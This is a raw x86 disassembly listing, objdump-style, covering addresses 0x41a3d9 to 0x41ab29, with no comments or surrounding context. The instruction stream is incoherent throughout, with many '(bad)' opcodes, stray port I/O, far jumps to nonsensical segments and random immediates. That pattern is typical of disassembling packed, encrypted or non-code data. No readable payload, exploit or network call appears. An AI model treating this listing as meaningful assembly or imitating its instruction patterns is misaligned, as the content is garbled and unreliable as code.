  41a3d9:	test   BYTE PTR [edi],bl
  41a3db:	shr    DWORD PTR [edi-0x29bd1e3b],1
  41a3e1:	push   eax
  41a3e2:	aam    0x86
  41a3e4:	mov    eax,0xdf2381eb
  41a3e9:	jmp    0x3e41:0xf337f22e
  41a3f0:	push   eax
  41a3f1:	sub    ecx,0x37
  41a3f4:	xor    al,0x1a
  41a3f6:	test   al,0xf7
  41a3f8:	sub    cl,BYTE PTR [edi+0x16]
  41a3fb:	daa    
  41a3fc:	sub    BYTE PTR ds:0x8a3410fd,0x61
  41a403:	es jl  0x41a454
  41a406:	xchg   edi,eax
  41a407:	retf   0xaeb5
  41a40a:	popf   
  41a40b:	ret    
  41a40c:	in     al,dx
  41a40d:	add    bl,dl
  41a40f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a410:	dec    esp
  41a411:	xchg   DWORD PTR [ebx+eax*4],esp
  41a414:	in     al,dx
  41a415:	inc    ebp
  41a416:	test   BYTE PTR [ebp-0x1714a641],bh
  41a41c:	fs scas al,BYTE PTR es:[edi]
  41a41e:	jo     0x41a473
  41a420:	push   edx
  41a421:	outs   dx,DWORD PTR ds:[esi]
  41a422:	lock sub DWORD PTR [edx*2-0x7cce45c8],esp
  41a42a:	push   cs
  41a42b:	lahf   
  41a42c:	repz sti 
  41a42e:	dec    edx
  41a42f:	aam    0xd0
  41a431:	dec    ebp
  41a432:	push   esp
  41a433:	fisttp WORD PTR [ebp+0x22]
  41a436:	out    0x2a,eax
  41a438:	push   esi
  41a439:	jne    0x41a47c
  41a43b:	scas   eax,DWORD PTR es:[edi]
  41a43c:	xchg   ebx,eax
  41a43d:	call   0xe003:0x9824437b
  41a444:	fidiv  WORD PTR [edi+0x67e1836b]
  41a44a:	inc    esi
  41a44b:	add    BYTE PTR [ebx-0x77214453],bl
  41a451:	push   es
  41a452:	xor    DWORD PTR [edx],0x504ed50e
  41a458:	xor    ebp,DWORD PTR [ebp-0x18]
  41a45b:	dec    ecx
  41a45c:	cmp    eax,0x2098ca63
  41a461:	cmp    al,0xf3
  41a463:	add    ah,BYTE PTR [edi]
  41a465:	data16 jne 0x41a48e
  41a468:	sub    eax,0x716fe2cd
  41a46d:	xor    eax,DWORD PTR [edx-0x3e480fd0]
  41a473:	push   es
  41a474:	call   0x44b452a6
  41a479:	add    al,0xa0
  41a47b:	loopne 0x41a42f
  41a47d:	xor    ecx,DWORD PTR [edi+0x830ff62]
  41a483:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a484:	inc    ecx
  41a485:	ret    0xe4
  41a488:	retf   0x1a80
  41a48b:	arpl   bx,dx
  41a48d:	pusha  
  41a48e:	pop    ebx
  41a48f:	out    0x2e,al
  41a491:	jno    0x41a48e
  41a493:	adc    ebp,DWORD PTR [edx-0x43430c37]
  41a499:	jns    0x41a46b
  41a49b:	jnp    0x41a4b1
  41a49d:	xchg   ebx,eax
  41a49e:	jb     0x41a466
  41a4a0:	pop    es
  41a4a1:	adc    edi,DWORD PTR [edx]
  41a4a3:	js     0x41a484
  41a4a5:	cmp    dl,dh
  41a4a7:	test   al,0xcc
  41a4a9:	sub    al,ah
  41a4ab:	fwait
  41a4ac:	rcr    BYTE PTR [esi-0x27],1
  41a4af:	add    edi,ebp
  41a4b1:	cs clc 
  41a4b3:	shl    BYTE PTR [ebx],1
  41a4b5:	adc    al,0x1f
  41a4b7:	sbb    ebx,DWORD PTR [ecx+0x24d97f46]
  41a4bd:	jne    0x41a444
  41a4bf:	pushf  
  41a4c0:	jge    0x41a522
  41a4c2:	mov    al,0xd
  41a4c4:	jecxz  0x41a4f5
  41a4c6:	dec    ecx
  41a4c7:	pop    ss
  41a4c8:	push   esi
  41a4c9:	mov    DWORD PTR [ebx-0x3e],esi
  41a4cc:	mov    ebp,0x22a208cf
  41a4d1:	jnp    0x41a46c
  41a4d3:	adc    al,0xa1
  41a4d5:	push   ds
  41a4d6:	jp     0x41a4fd
  41a4d8:	ret    0xc4aa
  41a4db:	rcr    BYTE PTR [ebx],1
  41a4dd:	mov    cl,0x8e
  41a4df:	aaa    
  41a4e0:	jb     0x41a525
  41a4e2:	mov    edx,0xbeba3365
  41a4e7:	mov    bh,0xe3
  41a4e9:	leave  
  41a4ea:	clc    
  41a4eb:	ins    BYTE PTR es:[edi],dx
  41a4ec:	pop    esi
  41a4ed:	mov    ebx,0x6a5c8bec
  41a4f2:	jmp    FWORD PTR [ecx+edx*1-0x5621bc10]
  41a4f9:	mov    eax,0x45c6fd6a
  41a4fe:	sbb    BYTE PTR [esi-0x64],0x13
  41a502:	jge    0x41a57f
  41a504:	mov    bh,0xda
  41a506:	and    al,0xf5
  41a508:	mov    ecx,0x660eff3a
  41a50d:	xchg   ebx,eax
  41a50e:	shl    DWORD PTR [ebx],0x4f
  41a511:	cmp    ebp,eax
  41a513:	mov    esp,0xa7ded03c
  41a518:	xor    eax,0xdb89806c
  41a51d:	mov    edx,0x96a358b3
  41a522:	int    0x41
  41a524:	jns    0x41a4dc
  41a526:	aad    0x36
  41a528:	lds    ecx,FWORD PTR [ecx+ebp*4]
  41a52b:	and    DWORD PTR cs:[edi],edx
  41a52e:	mov    ss,WORD PTR [ecx+0x5f]
  41a531:	ss scas eax,DWORD PTR es:[edi]
  41a533:	lock sar ebp,cl
  41a536:	mov    dl,0x79
  41a538:	ja     0x41a581
  41a53a:	clc    
  41a53b:	aas    
  41a53c:	adc    al,0xb5
  41a53e:	ds pop es
  41a540:	loopne 0x41a50a
  41a542:	(bad)  
  41a543:	enter  0x308b,0xdf
  41a547:	stos   DWORD PTR es:[edi],eax
  41a548:	test   BYTE PTR [ebp-0x33],ch
  41a54b:	nop
  41a54c:	xchg   BYTE PTR [edx+0x764342fd],al
  41a552:	jae    0x41a5a1
  41a554:	(bad)  
  41a555:	clc    
  41a556:	clc    
  41a557:	mov    dl,BYTE PTR [ecx+eiz*1+0x4db045a5]
  41a55e:	mov    dh,0x3f
  41a560:	cdq    
  41a561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a562:	sbb    BYTE PTR [edi-0x6dc4d845],al
  41a568:	pop    ss
  41a569:	xchg   edx,eax
  41a56a:	(bad)
  41a56d:	mov    BYTE PTR [edi],dl
  41a56f:	int3   
  41a570:	xor    al,0xa4
  41a573:	mov    BYTE PTR [edi+0x39],ch
  41a576:	sbb    ebx,DWORD PTR [edx]
  41a578:	adc    BYTE PTR [edx-0x74],0xa8
  41a57c:	mov    ebx,DWORD PTR gs:[edi]
  41a57f:	jmp    0x7104520d
  41a584:	push   ss
  41a585:	fidiv  DWORD PTR [edx]
  41a587:	arpl   WORD PTR [bp+di+0x3c],bp
  41a58b:	(bad)  
  41a58c:	jb     0x41a55b
  41a58e:	addr16 and edx,edx
  41a591:	inc    ebp
  41a592:	add    DWORD PTR [ecx-0x2c],edi
  41a595:	mov    al,0x55
  41a598:	xchg   DWORD PTR [esi],ecx
  41a59a:	inc    eax
  41a59b:	pushf  
  41a59c:	mov    ch,0xb9
  41a59e:	add    BYTE PTR [esi-0x39f15305],bl
  41a5a4:	push   cs
  41a5a5:	nop
  41a5a6:	add    al,0x21
  41a5a8:	aam    0x2b
  41a5aa:	pushf  
  41a5ab:	popa   
  41a5ac:	sbb    eax,0xeb3bee44
  41a5b1:	inc    eax
  41a5b2:	jecxz  0x41a5d4
  41a5b4:	shr    BYTE PTR ds:0xbf2d78c2,1
  41a5ba:	loope  0x41a572
  41a5bc:	jp     0x41a588
  41a5be:	retf   
  41a5bf:	das    
  41a5c0:	jb     0x41a569
  41a5c2:	and    eax,0x7544d0e9
  41a5c7:	xchg   edx,eax
  41a5c8:	fxch   st(3)
  41a5ca:	push   edi
  41a5cb:	mov    al,ds:0xbf080108
  41a5d0:	push   ss
  41a5d1:	inc    edi
  41a5d2:	cmp    al,0x99
  41a5d4:	jns    0x41a616
  41a5d6:	xchg   esp,eax
  41a5d7:	mov    esp,0x6b4c1f32
  41a5dc:	push   ebp
  41a5dd:	into   
  41a5de:	sti    
  41a5df:	dec    ebp
  41a5e0:	leave  
  41a5e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5e2:	fist   WORD PTR [ebx+ecx*1]
  41a5e5:	mov    eax,0xfbb85be0
  41a5ea:	mov    ch,al
  41a5ec:	adc    BYTE PTR [ebx-0x59e18d9e],dh
  41a5f2:	imul   ebx
  41a5f4:	rcl    BYTE PTR [edx],1
  41a5f6:	aaa    
  41a5f7:	add    eax,ecx
  41a5f9:	pusha  
  41a5fa:	clc    
  41a5fb:	ja     0x41a64f
  41a5fd:	jp     0x41a588
  41a5ff:	add    eax,0x37c8e60f
  41a604:	jne    0x41a5f4
  41a606:	pop    eax
  41a607:	fbstp  TBYTE PTR [esi+0x23]
  41a60a:	cld    
  41a60b:	dec    esi
  41a60c:	mov    esp,0xd0276487
  41a611:	rol    edi,1
  41a613:	and    cl,al
  41a615:	jns    0x41a5c9
  41a617:	add    al,0x80
  41a619:	dec    esi
  41a61a:	out    0x40,eax
  41a61c:	adc    BYTE PTR [esi],bl
  41a61e:	mov    eax,ds:0x699da083
  41a623:	and    BYTE PTR [edx+0x1503c219],cl
  41a629:	fnsave [esi-0x45]
  41a62c:	sub    dl,dl
  41a62e:	push   ds
  41a62f:	push   edx
  41a630:	mov    ebp,0xa9cb8fd8
  41a635:	pushf  
  41a636:	xchg   BYTE PTR [edi],dl
  41a638:	push   ebp
  41a639:	jl     0x41a613
  41a63b:	repz sar ch,cl
  41a63e:	inc    esp
  41a63f:	xchg   edi,eax
  41a640:	cmp    dh,BYTE PTR [ecx-0x1bf5e4e4]
  41a646:	mov    cl,0xde
  41a648:	es pop ds
  41a64a:	test   BYTE PTR [edx+0x6dcabb52],cl
  41a650:	and    al,0x32
  41a652:	sahf   
  41a653:	in     al,dx
  41a654:	int3   
  41a655:	inc    ebp
  41a656:	xor    DWORD PTR [ebp-0x6f],ebp
  41a659:	fimul  DWORD PTR [eax-0x1e]
  41a65c:	sub    DWORD PTR [edx-0x3bbb5508],edx
  41a662:	jg     0x41a68b
  41a664:	jns    0x41a68e
  41a666:	sub    DWORD PTR [edx],eax
  41a668:	push   ebx
  41a669:	pop    edi
  41a66a:	or     ah,cl
  41a66c:	aam    0xe0
  41a66e:	inc    edi
  41a66f:	pop    eax
  41a670:	push   esp
  41a671:	inc    eax
  41a672:	add    ch,BYTE PTR [ecx]
  41a674:	out    dx,eax
  41a675:	scas   al,BYTE PTR es:[edi]
  41a676:	add    ebp,DWORD PTR [esi]
  41a678:	lds    si,DWORD PTR [edx-0x7f]
  41a67c:	pop    ss
  41a67d:	inc    ebp
  41a67e:	(bad)  
  41a67f:	(bad)  
  41a680:	lods   al,BYTE PTR ds:[esi]
  41a681:	mov    edi,0x566d53e9
  41a686:	int3   
  41a687:	mov    edi,0x612a50a7
  41a68c:	mov    ebx,0x4062d235
  41a691:	jp     0x41a700
  41a693:	pop    edi
  41a694:	int3   
  41a695:	push   esp
  41a696:	data16 rcl al,cl
  41a699:	daa    
  41a69a:	mov    ds:0x7e6a17b0,al
  41a69f:	dec    di
  41a6a1:	aas    
  41a6a2:	push   edx
  41a6a3:	jecxz  0x41a672
  41a6a5:	mov    dl,0xba
  41a6a7:	mov    ds:0x199cbb6a,eax
  41a6ac:	pop    edx
  41a6ad:	jae    0x41a67e
  41a6af:	push   edi
  41a6b0:	mov    ds:0xe30ef81e,eax
  41a6b5:	or     eax,0xf4d52f2e
  41a6ba:	mov    ds,WORD PTR [di-0x6ea0]
  41a6bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6c0:	dec    eax
  41a6c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6c2:	mov    WORD PTR [ecx+edx*4-0x3b],?
  41a6c6:	dec    eax
  41a6c7:	inc    eax
  41a6c8:	adc    BYTE PTR [edx],0xdc
  41a6cb:	icebp  
  41a6cc:	imul   edi,DWORD PTR [esi-0x728995f2],0xdd4620d4
  41a6d6:	ins    BYTE PTR es:[edi],dx
  41a6d7:	icebp  
  41a6d8:	fmul   DWORD PTR [esi+0x78]
  41a6db:	xor    BYTE PTR [edx+0x5f61abfc],bh
  41a6e1:	(bad)  
  41a6e2:	xchg   esp,eax
  41a6e3:	and    al,0x18
  41a6e5:	jnp    0x41a67f
  41a6e7:	jl     0x41a6b9
  41a6e9:	cmp    ecx,ecx
  41a6eb:	jecxz  0x41a6c5
  41a6ed:	mov    BYTE PTR [ebp-0x56],dh
  41a6f0:	jmp    FWORD PTR [ebx]
  41a6f2:	shl    BYTE PTR [esi],cl
  41a6f4:	enter  0x9cd7,0xe6
  41a6f8:	push   es
  41a6f9:	and    eax,0x7336b461
  41a6fe:	inc    ecx
  41a6ff:	inc    esp
  41a700:	fist   WORD PTR [esi+0x13a60ee6]
  41a706:	mul    DWORD PTR [ebx-0x4cfc7f06]
  41a70c:	add    eax,0x86a6ea87
  41a711:	mov    ecx,0xc415d596
  41a716:	mov    eax,ds:0x53c9fd8c
  41a71b:	std    
  41a71c:	inc    eax
  41a71d:	dec    ecx
  41a71e:	and    eax,0x838a6326
  41a723:	imul   eax,DWORD PTR [ecx],0x540e3d78
  41a729:	in     al,0x2d
  41a72b:	stc    
  41a72c:	sar    DWORD PTR [ebp+0x13],0x62
  41a730:	cmp    DWORD PTR [ebp-0x5],0xffffff8a
  41a734:	dec    edi
  41a735:	leave  
  41a736:	cmp    eax,0x39bcfeb2
  41a73b:	adc    edi,DWORD PTR [esi+eax*2+0x5f]
  41a73f:	pop    edx
  41a740:	pop    ebx
  41a741:	push   es
  41a742:	jnp    0x41a776
  41a744:	mov    ds:0x74bd65a5,eax
  41a74a:	mov    bh,0x33
  41a74c:	iret   
  41a74d:	xor    ah,BYTE PTR [eax]
  41a74f:	inc    ecx
  41a750:	inc    esi
  41a751:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a752:	test   BYTE PTR [ebx+ebp*8+0x5d25da6c],ch
  41a759:	add    dh,ch
  41a75b:	in     al,0x5a
  41a75d:	xchg   esi,eax
  41a75e:	jne    0x41a752
  41a760:	xor    al,0x52
  41a762:	retf   0x1848
  41a765:	inc    eax
  41a766:	nop
  41a767:	adc    eax,0x65c0da52
  41a76c:	add    DWORD PTR [ebx+0x5e],0x195ccc4d
  41a773:	aaa    
  41a774:	cmc    
  41a775:	push   esp
  41a776:	fs cld 
  41a778:	aas    
  41a779:	pop    eax
  41a77a:	in     eax,dx
  41a77b:	std    
  41a77c:	shl    eax,0x7
  41a77f:	sub    eax,0xb0c0eb15
  41a784:	jg     0x41a7cd
  41a786:	mov    ebp,0xb52d05a9
  41a78b:	loop   0x41a79e
  41a78d:	fidiv  WORD PTR [ecx]
  41a78f:	dec    esp
  41a790:	xor    DWORD PTR [edx],0x11fd9b7d
  41a796:	shl    edx,1
  41a798:	xor    BYTE PTR [edx-0x6aa0c6b8],bh
  41a79e:	std    
  41a79f:	xor    eax,0x165565f1
  41a7a4:	pusha  
  41a7a5:	pop    ebp
  41a7a6:	xchg   ebx,eax
  41a7a7:	retf   0x9033
  41a7aa:	out    0x92,eax
  41a7ac:	add    BYTE PTR [ecx+0x6898ebb1],al
  41a7b2:	adc    BYTE PTR [ecx+0x5f],0x60
  41a7b6:	sbb    DWORD PTR [edi],esp
  41a7b8:	dec    edx
  41a7b9:	mov    ebp,0x5d8f087d
  41a7be:	(bad)  
  41a7bf:	rol    BYTE PTR [ebx+0x1],cl
  41a7c2:	jg     0x41a765
  41a7c4:	pusha  
  41a7c5:	push   ecx
  41a7c6:	rcl    edi,cl
  41a7c8:	push   edx
  41a7c9:	adc    esp,DWORD PTR [ebx+0x37]
  41a7cc:	fisubr DWORD PTR [ebx]
  41a7ce:	pop    ss
  41a7cf:	push   cs
  41a7d0:	dec    ebp
  41a7d1:	es mov dh,0x6
  41a7d4:	adc    BYTE PTR [eax+eiz*8],ch
  41a7d7:	sbb    dl,dh
  41a7d9:	(bad)
  41a7dc:	inc    ebp
  41a7dd:	or     ebx,DWORD PTR [edx+0x33]
  41a7e0:	inc    eax
  41a7e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7e2:	(bad)  
  41a7e3:	mov    dl,0x7e
  41a7e5:	sbb    eax,0x8d3e63a5
  41a7ea:	test   DWORD PTR [esi-0x1e7effa3],ecx
  41a7f0:	fmul   QWORD PTR [ebx]
  41a7f2:	sbb    al,ah
  41a7f4:	mov    edi,0xb46ec9d1
  41a7f9:	out    0x88,al
  41a7fb:	mov    edi,DWORD PTR [esi-0x7b18a6d5]
  41a801:	mov    dh,0xea
  41a803:	inc    ebx
  41a804:	push   edx
  41a805:	nop
  41a806:	repnz mov al,ds:0x223b2bf5
  41a80c:	or     bh,dh
  41a80e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a80f:	inc    ebx
  41a810:	lods   al,BYTE PTR ds:[esi]
  41a811:	inc    edx
  41a812:	push   es
  41a813:	stos   DWORD PTR es:[edi],eax
  41a814:	jl     0x41a7bb
  41a816:	mov    ds:0x1ca7c39,eax
  41a81b:	std    
  41a81c:	sub    eax,0xb9f03c34
  41a821:	(bad)  
  41a822:	cld    
  41a823:	(bad)  
  41a824:	push   edi
  41a825:	push   ebx
  41a826:	xchg   edi,eax
  41a827:	lds    ebx,FWORD PTR [esi+0x2cc148e]
  41a82d:	arpl   WORD PTR [edx-0x2e],bx
  41a830:	jp     0x41a83f
  41a832:	aam    0x72
  41a834:	dec    ecx
  41a835:	and    al,0x3
  41a837:	fst    DWORD PTR [edi+0x25a4458d]
  41a83d:	retf   0x741
  41a840:	dec    esi
  41a841:	mov    ah,0xfb
  41a843:	arpl   bp,bp
  41a845:	push   ebp
  41a846:	repnz mov al,ds:0x9ac3767a
  41a84c:	xor    ecx,DWORD PTR [edi-0xc55cf6]
  41a852:	xchg   BYTE PTR [edx+0x6b],bh
  41a855:	lea    eax,fs:[ebx]
  41a858:	in     eax,0x8c
  41a85a:	cmovg  ecx,DWORD PTR ss:[edi-0x7b]
  41a85f:	lock pop ecx
  41a861:	pop    ss
  41a862:	adc    al,0x82
  41a864:	xor    dh,BYTE PTR [eax+0x1abd2c1]
  41a86a:	cmp    BYTE PTR [ebx-0x4d0ddd8],dh
  41a870:	out    0x38,al
  41a872:	xchg   esi,eax
  41a873:	adc    esp,eax
  41a875:	in     eax,dx
  41a876:	and    edx,edi
  41a878:	out    dx,al
  41a879:	shl    DWORD PTR [esi+0x54],1
  41a87c:	(bad)  
  41a87d:	mov    al,ds:0xceb191ab
  41a882:	jbe    0x41a866
  41a884:	sub    al,0x90
  41a886:	and    al,0xd3
  41a888:	retf   
  41a889:	xor    DWORD PTR [edi],edx
  41a88b:	xor    al,0xac
  41a88d:	daa    
  41a88e:	arpl   WORD PTR [ebx+0x4f],bx
  41a891:	gs je  0x41a8e4
  41a894:	loop   0x41a8bf
  41a896:	xor    esp,DWORD PTR [ebp-0x2afaf798]
  41a89c:	imul   eax,DWORD PTR [edx-0x141e6b7a],0xee921ba1
  41a8a6:	jge    0x41a8cc
  41a8a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8a9:	add    eax,0xca1c6b98
  41a8ae:	inc    esi
  41a8af:	int3   
  41a8b0:	rol    BYTE PTR [edi+0x8],cl
  41a8b3:	mov    edx,0xb8317eb1
  41a8b8:	inc    eax
  41a8b9:	sbb    eax,0xc740f30c
  41a8be:	cmp    al,0x54
  41a8c0:	clc    
  41a8c1:	sbb    DWORD PTR [ebp-0x25],0x99e2dbc9
  41a8c8:	sti    
  41a8c9:	xchg   esp,eax
  41a8ca:	pushf  
  41a8cb:	ret    0xc635
  41a8ce:	ror    dl,0x2e
  41a8d1:	pop    ss
  41a8d2:	mov    al,0xde
  41a8d4:	fisttp DWORD PTR [esi]
  41a8d6:	pop    ss
  41a8d7:	test   eax,0xdf63dedc
  41a8dc:	xor    BYTE PTR [eax-0x3f],0xbd
  41a8e0:	pop    edx
  41a8e1:	and    eax,0x8fec09e
  41a8e6:	or     cl,BYTE PTR [ebx]
  41a8e8:	repz mov esi,0xdc9054ff
  41a8ee:	retf   
  41a8ef:	xchg   esi,eax
  41a8f0:	stc    
  41a8f1:	sbb    al,0xcf
  41a8f3:	sub    BYTE PTR [edx+0x79e72bc7],dh
  41a8f9:	test   DWORD PTR [edx],edx
  41a8fb:	dec    esi
  41a8fc:	mov    ebx,0x40c49165
  41a901:	xor    al,BYTE PTR [eax]
  41a903:	lahf   
  41a904:	jno    0x41a90c
  41a906:	lods   eax,DWORD PTR ds:[esi]
  41a907:	jb     0x41a892
  41a909:	mov    ss,WORD PTR [esi-0x3d]
  41a90c:	inc    eax
  41a90d:	sub    edi,DWORD PTR [edi+0x561bff75]
  41a913:	shl    dl,cl
  41a915:	xchg   edx,eax
  41a916:	pusha  
  41a917:	or     DWORD PTR [ebx+0x17db387a],ecx
  41a91d:	pop    esp
  41a91e:	test   DWORD PTR [ebp-0x15345],ebp
  41a924:	ror    DWORD PTR [edx],cl
  41a926:	dec    esi
  41a927:	lods   al,BYTE PTR ds:[esi]
  41a928:	cmc    
  41a929:	call   DWORD PTR [ecx+0x478000cf]
  41a92f:	and    al,0x20
  41a931:	mov    dl,0xef
  41a933:	mov    ecx,0x3334f6fb
  41a938:	pop    eax
  41a939:	cmp    al,0x2d
  41a93b:	lds    eax,FWORD PTR [ebx-0x52]
  41a93e:	cwde   
  41a93f:	test   eax,0x51f05083
  41a944:	shl    DWORD PTR [ebx],0xd8
  41a947:	pop    edi
  41a948:	xlat   BYTE PTR ds:[ebx]
  41a949:	mov    eax,ds:0xa0766568
  41a94e:	neg    bl
  41a950:	shr    WORD PTR [edx-0x405dded4],cl
  41a957:	adc    esi,DWORD PTR [ecx-0x6e]
  41a95a:	or     al,0xb4
  41a95c:	fst    QWORD PTR [edx+0x5f]
  41a95f:	shr    DWORD PTR [eax],0x42
  41a962:	push   es
  41a963:	fstp   TBYTE PTR [ecx+0x59]
  41a966:	repz sub ah,BYTE PTR ds:0xc138eee9
  41a96d:	bnd jb 0x41a93d
  41a970:	ja     0x41a9e1
  41a972:	inc    BYTE PTR [ebx-0x1dbbfb24]
  41a978:	das    
  41a979:	std    
  41a97a:	popf   
  41a97b:	bnd jo 0x41a9f5
  41a97e:	test   eax,0xab59e9aa
  41a983:	pop    ss
  41a984:	fs push ebx
  41a986:	fadd   QWORD PTR [ebp+0x3492da51]
  41a98c:	inc    ecx
  41a98d:	push   esi
  41a98e:	(bad)  
  41a98f:	ja     0x41a9cf
  41a991:	and    BYTE PTR [edx],ch
  41a993:	(bad)  {k3}{z}
  41a998:	mov    edi,0xdaf1fcee
  41a99d:	cld    
  41a99e:	adc    ah,dl
  41a9a0:	mov    edx,0xc8215b23
  41a9a5:	iret   
  41a9a6:	hlt    
  41a9a7:	cli    
  41a9a8:	jle    0x41a968
  41a9aa:	jb     0x41aa23
  41a9ac:	inc    ebp
  41a9ad:	in     al,0x2
  41a9af:	dec    esp
  41a9b0:	dec    edi
  41a9b1:	mov    cl,0x7c
  41a9b3:	aam    0x49
  41a9b5:	fist   DWORD PTR [edi+0x34]
  41a9b8:	jl     0x41aa37
  41a9ba:	icebp  
  41a9bb:	adc    BYTE PTR ds:0x345e6531,ah
  41a9c1:	mov    dh,0xf2
  41a9c3:	arpl   sp,bx
  41a9c5:	fadd   DWORD PTR [edx+0xc4e7f08]
  41a9cb:	xchg   bl,bh
  41a9cd:	xchg   BYTE PTR [esi-0x19ef3773],dl
  41a9d3:	sbb    esi,ecx
  41a9d5:	inc    esp
  41a9d6:	mov    dl,0x99
  41a9d8:	xchg   edx,eax
  41a9d9:	xor    eax,0x807d491e
  41a9de:	leave  
  41a9df:	popf   
  41a9e0:	jo     0x41a962
  41a9e2:	ins    DWORD PTR es:[edi],dx
  41a9e3:	std    
  41a9e4:	sub    edx,DWORD PTR [edi-0x56]
  41a9e7:	test   al,0x56
  41a9e9:	pusha  
  41a9ea:	or     DWORD PTR [ecx+0x29],eax
  41a9ed:	js     0x41aa04
  41a9ef:	cld    
  41a9f0:	push   cs
  41a9f1:	cdq    
  41a9f2:	das    
  41a9f3:	jmp    0x41a9ef
  41a9f5:	jne    0x41a997
  41a9f7:	sub    cl,BYTE PTR [esi]
  41a9f9:	movups xmm1,xmm0
  41a9fc:	popa   
  41a9fd:	sbb    DWORD PTR [ecx],ebp
  41a9ff:	aaa    
  41aa00:	sti    
  41aa01:	pop    esi
  41aa02:	dec    esp
  41aa03:	adc    al,0xa7
  41aa05:	jp     0x41aa0b
  41aa07:	sar    BYTE PTR [ecx+esi*2],cl
  41aa0a:	out    0xd4,al
  41aa0c:	push   ebp
  41aa0d:	lods   eax,DWORD PTR ds:[esi]
  41aa0e:	sub    DWORD PTR fs:0x33740c4,edi
  41aa15:	outs   dx,DWORD PTR ds:[esi]
  41aa16:	mov    ds:0x243744cd,al
  41aa1b:	dec    edi
  41aa1c:	dec    edi
  41aa1d:	xchg   ecx,eax
  41aa1e:	inc    esi
  41aa1f:	xor    BYTE PTR [ebx+ebx*4+0x28],0x5c
  41aa24:	sub    al,0x6d
  41aa26:	rol    BYTE PTR [ebx+0x1968967f],cl
  41aa2c:	sbb    eax,0x9128646d
  41aa31:	jne    0x41aa1f
  41aa33:	lock int 0xed
  41aa36:	outs   dx,BYTE PTR ds:[esi]
  41aa37:	scas   eax,DWORD PTR es:[edi]
  41aa38:	xlat   BYTE PTR ds:[ebx]
  41aa39:	out    0x97,al
  41aa3b:	in     eax,dx
  41aa3c:	sbb    DWORD PTR [ebx+esi*1-0x6b],eax
  41aa40:	ja     0x41aa9e
  41aa42:	outs   dx,DWORD PTR ds:[esi]
  41aa43:	out    dx,eax
  41aa44:	clc    
  41aa45:	push   esp
  41aa46:	(bad)  
  41aa47:	mov    dh,0x3c
  41aa49:	cmp    DWORD PTR [ebx],eax
  41aa4b:	rcr    DWORD PTR [edx],1
  41aa4d:	stos   DWORD PTR es:[edi],eax
  41aa4e:	cmp    DWORD PTR [edi+eiz*8+0x441e34da],ecx
  41aa55:	outs   dx,DWORD PTR ds:[esi]
  41aa56:	gs loopne 0x41a9fa
  41aa59:	arpl   WORD PTR [edx],bx
  41aa5b:	retf   
  41aa5c:	bound  esi,QWORD PTR [ebx]
  41aa5e:	xchg   ebp,eax
  41aa5f:	or     BYTE PTR ss:[ebp-0x4066f064],al
  41aa66:	out    0x2f,al
  41aa68:	add    al,0x90
  41aa6a:	icebp  
  41aa6b:	(bad)  [ebx+0x70279a58]
  41aa71:	inc    edx
  41aa72:	mov    eax,ebp
  41aa74:	das    
  41aa75:	loopne 0x41a9fb
  41aa77:	stos   DWORD PTR es:[edi],eax
  41aa78:	or     DWORD PTR [esi+0x4b842b74],edx
  41aa7e:	dec    edx
  41aa7f:	popf   
  41aa80:	dec    esi
  41aa81:	ret    
  41aa82:	scas   al,BYTE PTR es:[edi]
  41aa83:	mov    ebp,0xcd6c3917
  41aa88:	xchg   esi,edi
  41aa8a:	ret    
  41aa8b:	lahf   
  41aa8c:	repnz add dh,al
  41aa8f:	push   0x6e92fd00
  41aa94:	popf   
  41aa95:	xchg   esp,eax
  41aa96:	sbb    dh,BYTE PTR [edx+0x6e0ef5a9]
  41aa9c:	hlt    
  41aa9d:	push   es
  41aa9e:	sub    ebp,0x626ebdba
  41aaa4:	sbb    ebx,DWORD PTR [edi-0x38]
  41aaa7:	test   al,0x8
  41aaa9:	inc    edi
  41aaaa:	xor    eax,0xd836cf20
  41aaaf:	adc    BYTE PTR [ebx+0x36],dh
  41aab2:	jle    0x41aafa
  41aab4:	rol    DWORD PTR [ebp+edi*2+0x3b],cl
  41aab8:	inc    esp
  41aab9:	mov    dl,0xdf
  41aabb:	xchg   ebx,eax
  41aabc:	aaa    
  41aabd:	dec    edx
  41aabe:	pop    edi
  41aabf:	adc    BYTE PTR [esi-0x79],dl
  41aac2:	push   ecx
  41aac3:	out    0x5c,al
  41aac5:	jbe    0x41ab08
  41aac7:	test   eax,0xe1c7cfeb
  41aacc:	adc    ebx,DWORD PTR [edi]
  41aace:	repnz int3 
  41aad0:	sti    
  41aad1:	popf   
  41aad2:	repnz cmp ah,al
  41aad5:	mov    bl,cl
  41aad7:	ja     0x41aa5e
  41aad9:	bound  ecx,QWORD PTR [ebp-0x1f]
  41aadc:	mov    WORD PTR [esi],ds
  41aade:	mov    ecx,ecx
  41aae0:	mov    dl,0xe9
  41aae2:	and    al,0x99
  41aae4:	adc    dh,al
  41aae6:	mov    ebx,0x7207691d
  41aaeb:	test   DWORD PTR [esi-0x51],ecx
  41aaee:	jns    0x41aa72
  41aaf0:	loopne 0x41aa73
  41aaf2:	jge    0x41aa95
  41aaf4:	(bad)  
  41aaf5:	into   
  41aaf6:	push   0x378aca41
  41aafb:	inc    edi
  41aafc:	clc    
  41aafd:	(bad)  
  41aafe:	test   eax,0x942e1913
  41ab03:	sti    
  41ab04:	xchg   esp,eax
  41ab05:	sub    eax,0xc8489e29
  41ab0a:	pushf  
  41ab0b:	icebp  
  41ab0c:	jp     0x41ab08
  41ab0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab0f:	inc    ebx
  41ab10:	sub    al,dh
  41ab12:	and    edi,DWORD PTR [ebx]
  41ab14:	pushf  
  41ab15:	aaa    
  41ab16:	out    0x1a,al
  41ab18:	add    al,0x2c
  41ab1a:	in     al,dx
  41ab1b:	int    0x1d
  41ab1d:	sbb    DWORD PTR [ebp+0x2c398eb],ebp
  41ab23:	mov    ch,0x1e
  41ab25:	sbb    al,0x63
  41ab27:	xchg   ebx,eax
  41ab28:	(bad)  
  41ab29:	aad    0x5a
